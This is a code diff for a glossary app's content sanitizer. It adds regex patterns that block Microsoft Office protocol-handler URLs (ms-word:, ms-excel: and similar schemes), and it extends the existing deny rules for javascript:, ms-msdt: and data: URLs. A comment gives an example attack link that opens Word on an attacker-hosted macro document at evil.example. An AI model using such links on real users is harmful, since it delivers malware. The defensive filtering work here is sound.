@@ -572,6 +572,15 @@ const unsafeContentPatterns = [
   // App Installer malware-delivery vector (CVE-2021-43890). Block them like the
   // javascript:/vbscript: executable schemes; the names never occur in glossary prose.
   { pattern: /\bms-(?:msdt|appinstaller)\s*:/i, reason: 'Windows protocol-handler URLs are not allowed in article content' },
+  // The Microsoft Office URI schemes (ms-word:/ms-excel:/ms-powerpoint:/ms-visio:/
+  // ms-access:/ms-project:/ms-publisher:/ms-infopath:/ms-spd:) hand the URL to the
+  // locally-installed Office app instead of the browser. A clicked
+  // `ms-word:ofe|u|https://evil.example/x.docm` launches Word pointed at an
+  // attacker-hosted (potentially macro-enabled) document outside the page sandbox
+  // with no script — the same native protocol-handler malware-delivery class as the
+  // blocked ms-appinstaller:/ms-msdt: schemes. A glossary's prose never links to a
+  // local Office app, and the names never occur in glossary text.
+  { pattern: /\bms-(?:word|excel|powerpoint|visio|access|project|publisher|infopath|spd)\s*:/i, reason: 'Microsoft Office document protocol-handler URLs are not allowed in article content' },
   { pattern: /\bdata\s*:\s*text\/html/i, reason: 'HTML data URLs are not allowed in article content' },
   { pattern: /\bdata\s*:\s*image\/svg\+xml/i, reason: 'SVG data URLs are not allowed in article content' },
   { pattern: /\bdata\s*:\s*application\/xhtml\+xml/i, reason: 'XHTML data URLs are not allowed in article content' },
@@ -593,6 +602,7 @@ const obfuscatedSchemePatterns = [
   { pattern: /javascript\s*:/i, reason: 'javascript: URLs are not allowed in article content' },
   { pattern: /vbscript\s*:/i, reason: 'vbscript: URLs are not allowed in article content' },
   { pattern: /ms-(?:msdt|appinstaller)\s*:/i, reason: 'Windows protocol-handler URLs are not allowed in article content' },
+  { pattern: /ms-(?:word|excel|powerpoint|visio|access|project|publisher|infopath|spd)\s*:/i, reason: 'Microsoft Office document protocol-handler URLs are not allowed in article content' },
   { pattern: /data\s*:\s*text\/html/i, reason: 'HTML data URLs are not allowed in article content' },
   { pattern: /data\s*:\s*image\/svg\+xml/i, reason: 'SVG data URLs are not allowed in article content' },
   { pattern: /data\s*:\s*application\/xhtml\+xml/i, reason: 'XHTML data URLs are not allowed in article content' },
@@ -604,6 +614,7 @@ const infoboxRowValueSchemePatterns = [
   /javascript\s*:/i,
   /vbscript\s*:/i,
   /ms-(?:msdt|appinstaller)\s*:/i,
+  /ms-(?:word|excel|powerpoint|visio|access|project|publisher|infopath|spd)\s*:/i,
   /data\s*:\s*text\/html/i,
   /data\s*:\s*image\/svg\+xml/i,
   /data\s*:\s*application\/xhtml\+xml/i,
